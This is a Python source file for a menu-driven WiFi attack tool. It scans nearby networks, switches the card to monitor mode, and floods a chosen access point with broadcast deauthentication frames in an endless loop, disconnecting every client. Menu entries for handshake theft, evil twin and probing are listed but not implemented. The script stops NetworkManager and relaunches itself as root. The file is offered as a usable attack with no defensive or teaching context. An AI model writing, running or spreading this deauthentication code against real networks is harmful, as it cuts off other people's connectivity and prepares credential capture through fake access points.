import frame_sender
import time
from curses import wrapper
import curses
import subprocess
import os
import sys
import re

frequencies = {
    2412:  1,
    2417:  2,
    2422:  3,
    2427:  4,
    2432:  5,
    2437:  6,
    2442:  7,
    2447:  8,
    2452:  9,
    2457: 10,
    2462: 11,
    2467: 12,
    2472: 13,
}


root_menu_items = [
    'Scan for wifi networks',
    'Evil hotspots',
    'Exit'
]

todo_items = [
    'Deauth clients',
    'Steal Handshake',
    'Evil twin',
    'Probing',
    'Back'
]

def showMenuWithSelection(window, pos, items, menuName=''):
    window.clear()
    window.addstr(0, 0, menuName)

    for index, item in enumerate(items):
        window.addstr(index + 1, 2, item)

    while(True):
        window.addstr(pos + 1, 0, ">", curses.color_pair(1))
        key = window.getch()

        if key == ord('s') or key == curses.KEY_DOWN:
            window.addstr(pos + 1, 0, " ")
            pos += 1
            if pos == len(items):
                pos = 0
        elif key == ord('w') or key == curses.KEY_UP:
            window.addstr(pos + 1, 0, " ")
            pos -= 1
            if pos == -1:
                pos = (len(items) - 1)
        elif key == curses.KEY_ENTER or key == 10:
            window.clear()
            return pos
        elif key == ord('q'):
            exit(0)

def is_tool_installed(tool_name):
    try:
        # Run the iwconfig command and capture its output
        subprocess.run([tool_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        return True
    except FileNotFoundError as e:
        return False

def changeInterfaceChannel(interface, channel):
    subprocess.run(["iwconfig", interface, "channel", str(channel)], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)

def enable_monitor_mode(interface, enable=True):
    if enable:
        mode = "Monitor"
    else:
        mode = "Managed"
    try:
        if enable:
            subprocess.run(["systemctl", "stop", "NetworkManager"],stdout=subprocess.PIPE, check=True)

        subprocess.run(["ifconfig", interface, "down"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        subprocess.run(['iwconfig', interface, 'mode', mode.lower()], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        subprocess.run(["ifconfig", interface, "up"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        
        if not enable:
            subprocess.run(["systemctl", "start", "NetworkManager"],stdout=subprocess.PIPE, check=True)
            
        # subprocess.run(["systemctl", "restart", "NetworkManager"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        result = subprocess.run(["iwconfig", interface], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        result = re.findall(r"(?<=Mode:)\w+", str(result.stdout))[0]


        if result != mode:
            return False

        return True

    except subprocess.CalledProcessError as e:
        return False

def showWifiSelectionList(window, interface):
    wifis = []
    window.clear()
    window.addstr(">> Scraping wifi...", curses.color_pair(1))
    window.refresh()
    try:
        result = subprocess.run(["iwlist", interface, "scan"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, check=True)
        result = str(result.stdout)
        result = result.split("Cell ")

        for wifi_fragment in result: 
            found = re.findall(r"(?<=Address:\s)(?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}|(?<=ESSID:\").+\"|(?<=Channel:)\d+", wifi_fragment)
            if found != []:
                wifis.append(found)
        # result = [' '.join(result[i:i+3]) for i in range(0, len(result), 3)]
        # print(result)

    except subprocess.CalledProcessError as e:
        return False
    
    for wifi in wifis:
        if len(wifi) != 3:
            wifi.insert(2, 'NO_NAME')
    
    formatted = [f"{wifi[0]:20} {wifi[2]:50} {wifi[1]:2}" for wifi in wifis]
    
    selected_index = showMenuWithSelection(window, 0, formatted, f"  {'MAC':20} {'BSSID':50} {'CHANNEL':2}")
    return wifis[selected_index]


def do_deuth_all(window, wifi, interface):
    try:
        posPrint = 1
        window.clear()
        window.timeout(-1)
        window.addstr(0, 0, f"Changing channel of {interface} to {wifi[1]}")
        window.refresh()
        changeInterfaceChannel(interface, wifi[1])

        window.addstr(1, 0, f"Deauthing {wifi[0]} : {wifi[2]}...")
        window.refresh()
        frame_engine = frame_sender.FrameEngine()
        frame_engine.init_deauth(mac_receiver="ff:ff:ff:ff:ff:ff", mac_sender=wifi[0])
        
        while True:
            frame_engine.send_deauth(interface=interface)
            window.addstr(2, 0, f"{posPrint} Sent deauth frame (q - to exit)", curses.color_pair(1))
            window.refresh()
            posPrint+=1
            time.sleep(0.2)
    except:
        return

def logic(stdscr):
    curses.curs_set(0)
    root_menu_pos = 0
    interface = "wlo1"

    root_menu_pos = showMenuWithSelection(stdscr, root_menu_pos, root_menu_items)
    if root_menu_pos == 0:
        selected_wifi = showWifiSelectionList(stdscr, interface)

        if selected_wifi == False:
            enable_monitor_mode(interface, False)
        
        selected_action = showMenuWithSelection(stdscr, 0, todo_items, "Actions:")


        if selected_action == 0:
          
            if enable_monitor_mode(interface, True):
                do_deuth_all(stdscr, selected_wifi, interface)
                enable_monitor_mode(interface, False)




def main():
    euid = os.geteuid()

    if euid != 0:
        print("Script not started as root. Running sudo..")
        args = ['sudo', sys.executable] + sys.argv + [os.environ]
        # the next line replaces the currently-running process with the sudo
        os.execlpe('sudo', *args)

    if not is_tool_installed("iwconfig"):
        print("Cannot locate iwconfig on this system, try install wireless-tools")
        exit(-1)
    # mac = enable_monitor_mode("wlo1")

    wrapper(logic)

if __name__ == "__main__":
    main()



